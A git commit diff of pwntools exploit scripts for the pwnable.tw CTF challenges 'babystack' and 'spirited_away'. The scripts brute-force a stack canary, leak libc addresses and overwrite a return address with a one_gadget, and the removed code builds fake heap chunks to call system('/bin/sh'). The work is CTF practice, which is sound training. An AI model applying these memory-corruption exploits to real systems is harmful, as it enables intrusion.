86360744cf4d9201706023b94b62baf8e83e3a70
dkmos2016 <dkmos2016@126.com>
2021-03-04 17:45:07 +0800

    update babystack_writeup.py(undone)

--- babystack_writeup.py
+++ babystack_writeup.py
@@ -4,24 +4,24 @@ import sys
 
 
 def login(pwd):
-    p.sendlineafter('>> ', '1')
-    p.sendlineafter('Your passowrd :', pwd)
+    p.sendafter('>> ', '1')
+    p.sendafter('Your passowrd :', pwd)
     cont = p.recvline()
 
     return False if 'Failed' in cont else True
 
 
 def logout():
-    p.sendlineafter('>> ', '1')
+    p.sendafter('>> ', '1')
 
 
 def EXIT():
-    p.sendlineafter('>> ', '2')
+    p.sendafter('>> ', '2')
 
 
 def read_input(cont, op=''):
-    p.sendlineafter('>> ', '3')
-    p.sendlineafter('Copy :', cont + op)
+    p.sendafter('>> ', '3' + 'a' * 15)
+    p.sendafter('Copy :', cont + op)
 
 
 def brude(sz=0x10):
@@ -32,7 +32,7 @@ def brude(sz=0x10):
             if c == 10:
                 continue
             __cont = _cont + chr(c)
-            if login(__cont):
+            if login(__cont + '\n'):
                 print('idx: {}, enumc:{:#x}'.format(idx, c))
                 logout()
                 _cont = __cont
@@ -41,49 +41,50 @@ def brude(sz=0x10):
     return _cont
 
 
-DEBUG = False
+DEBUG = True
 
 # context.proxy = (socks.HTTP, '192.168.152.1', 19999)
 
 if DEBUG:
     p = process('/home/len/pwnable/babystack')
-    elf = ELF('/home/len/pwnable/glibcs/glibcs/lib/libc.so.6')
+    elf = ELF('/home/len/pwnable/glibcs/glibc-2.23-x64/lib/libc.so.6')
 else:
     p = remote('chall.pwnable.tw', 10205)
     elf = ELF('/home/len/pwnable/libc_64.so.6')
 
 gadget_offset = 0x4526A
-_IO_2_1_stdout_offset = 0x1ec6a0
-
+_IO_2_1_stdout_offset = elf.symbols['_IO_2_1_stdout_']
 
 if __name__ == '__main__':
     while True:
         canary = brude()
         if len(canary) != 16:
             p.close()
-            p = remote('chall.pwnable.tw', 10205)
+            p = process('/home/len/pwnable/babystack')
             continue
         else:
             print(canary.encode('hex'))
 
             # for leak libc_address
-            p.sendlineafter('>> ', 'a')
-            login('')
-            read_input('a' * 0x3f, op='1')
+            pdb.set_trace()
+            p.sendafter('>> ', 'a')
+            login('\0'.ljust(0x40, 'a'))
+            read_input('b' * 0x10)
+            logout()
+            # read_input('a' * 0x3f, op='1')
             _IO_2_1_stdout_addr = u64(brude(8).ljust(8, '\0'))
             print('_IO_2_1_stdout_addr: {:#x}'.format(_IO_2_1_stdout_addr))
             libc_base = _IO_2_1_stdout_addr - _IO_2_1_stdout_offset
             print('libc_base: {:#x}'.format(libc_base))
-            if libc_base % 0x1000 !=0:
+            if libc_base % 0x1000 != 0:
                 continue
-            
 
             # payload
             gadget_addr = libc_base + gadget_offset
             print('gadget_addr: {:#x}'.format(gadget_addr))
             pdb.set_trace()
-            login('\x00'.ljust(0x40, 'a') + canary + 'a' * 0x18 + p64(gadget_addr) +
-                'c' * (0xd))
+            login('\x00'.ljust(0x40, 'a') + canary + 'a' * 0x18 +
+                  p64(gadget_addr) + 'c' * (0xd))
             read_input('b' * 0x3f, '2')
             p.interactive()
             break
--- test.py
+++ test.py
@@ -1,84 +1,70 @@
 from pwn import *
-# import gdb
-# context.log_level = "debug"
+import pdb
 
-debug = 1
+DEBUG = True
 
-if debug:
-    p = process('/home/len/pwnable/spirited_away')
-    libc = ELF("/home/len/pwnable/glibcs/glibcs/lib/libc.so.6")
-    # gdb.attach(p)
+# context.proxy = (socks.HTTP, '192.168.152.1', 19999)
 
+if DEBUG:
+    p = process('/home/len/pwnable/babystack')
+    e = ELF('/home/len/pwnable/glibcs/glibcs/lib/libc.so.6')
 else:
-    p = remote("chall.pwnable.tw", 10204)
-    libc = ELF("./spirited_away_libc_32.so.6")
+    p = remote('chall.pwnable.tw', 10205)
+    e = ELF('/home/len/pwnable/libc_64.so.6')
+
+one_offset=0xf0567
 
 
-def input_thing(name, age, reason, comment):
-    p.recvuntil("your name: ")
-    p.send(name)
-    p.recvuntil("your age: ")
-    p.sendline(str(age))
-    p.recvuntil("see this movie? ")
-    p.send(reason)
-    p.recvuntil("your comment: ")
-    p.send(comment)
+def ru(x):
+    return p.recvuntil(x)
 
-    p.recvuntil("Name: ")
-    res_name = p.recvuntil("\n")
-    p.recvuntil("Age: ")
-    res_age = p.recvuntil("\n")
-    p.recvuntil("Reason: ")
-    res_reason = p.recvuntil("\n")
-    p.recvuntil("Comment: ")
-    res_comment = p.recvuntil("\n")
+def se(x):
+    p.send(x)
 
-    return res_name, res_age, res_reason, res_comment
+def login(pwd,lo=True):
+    if lo:
+        se('1'+'a'*15)
+    else:
+        se('1')
+    ru('Your passowrd :')
+    se(pwd)
+    return ru('>> ')
 
+def logout():
+    se('1')
+    ru('>> ')
 
-def _leave_comment():
-    p.recvuntil("comment? <y/n>: ")
-    p.sendline("y")
+def copy(content):
+    se('3'+'a'*15)
+    ru('Copy :')
+    se(content)
+    ru('>> ')
 
+def Exit():
+    se('2')
 
-comment_num = 0x0804A070
-_, _, reason, _ = input_thing("test", 1, "1" * 0x18, "1" * 1)
-libc.address = u32(reason[0x18:0x18 + 4]) - 7 - libc.symbols['_IO_file_sync']
-print "libc address", hex(libc.address)
-_leave_comment()
-_, _, reason, _ = input_thing("test", 1, "1" * 0x38, "1" * 1)
-_leave_comment()
-stack_address = u32(reason[0x38:0x38 + 4]) - 0x20
-reason_stack = stack_address - 0x50
-print "stack address", hex(stack_address)
+def guess(length,secret=''):
+    for i in range(length):
+        for q in range(1,256):
+            if 'Success' in login(secret+chr(q)+'\n',False):
+                secret+=chr(q)
+                logout()
+                break
+    return secret
 
-for i in range(98):
-    name, age, reason, comment = input_thing("1" * 0x3c, 1, "2" * 0x50,
-                                             "3" * 0x3c)
-    _leave_comment()
-    log.success("current time " + str(i))
-# set fake chunk
-reason_payload = p32(0) + p32(0x41) + "a" * 0x38 + p32(0) + p32(0x41)
-comment_payload = "1" * 0x54 + p32(reason_stack + 8) + p32(0) + p32(0x41)
-name, age, reason, comment = input_thing("test", 1, reason_payload,
-                                         comment_payload)
-_leave_comment()
+secret=guess(16)
 
-system_address = libc.symbols['system']
-bin_sh_address = next(libc.search("/bin/sh\x00"))
+pdb.set_trace()
+login('\x00'+'a'*0x57)
+copy('b'*40)
+logout()
+p.interactive()
+base=u64(guess(6,'a'*16+'1'+'a'*7)[24:]+'\x00\x00')-324-e.symbols['setvbuf']
+one_gadget=base+one_offset
+payload='\x00'+'a'*63+secret+'a'*24+p64(one_gadget)
+login(payload)
+copy('a'*0x30)
+Exit()
+print(hex(base))
 
-payload = "1" * 0x48
-payload += "1" * 4 + p32(system_address) + "1" * 4 + p32(bin_sh_address)
-
-p.recvuntil("your name: ")
-p.send(payload)
-p.recvuntil("your age: ")
-p.sendline("1")
-p.recvuntil("see this movie? ")
-p.send("1")
-p.recvuntil("your comment: ")
-p.send("1")
-
-p.recvuntil("comment? <y/n>: ")
-p.sendline("n")
 p.interactive()
